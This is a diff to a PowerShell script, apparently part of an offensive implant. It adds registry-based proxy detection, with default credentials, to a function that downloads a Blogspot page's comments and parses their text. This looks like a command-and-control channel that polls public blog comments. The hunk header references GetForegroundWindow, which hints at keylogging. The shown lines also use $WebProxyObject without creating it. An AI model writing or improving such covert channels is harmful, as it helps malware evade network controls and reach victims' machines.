@@ -821,6 +821,19 @@ public static extern IntPtr GetForegroundWindow();
         Function GetLatestTweet {
              $word = 'comment-content'
             $WebClientObject = New-Object Net.WebClient
+            
+            $ProxyCheck = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable
+            
+                if ($ProxyCheck -eq 1) {
+                    Write-Verbose "Proxy configuration found, enabling proxy settings"
+                    [string] $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
+                    $WebProxyObject.Address = $ProxyAddress
+                    $WebProxyObject.UseDefaultCredentials = $True
+                    $WebClientObject.Proxy = $WebProxyObject
+                }
+            
+            
+            
             $testo = "http://networksecuritytester.blogspot.it/2015/03/corso-cyberwar.html?showComment"
             $CommentResult = $WebClientObject.DownloadString($testo)
             [string]$Commentstring = [regex]::matches( $CommentResult,  '(?i)<p[^>]*>(.*)</p>' )
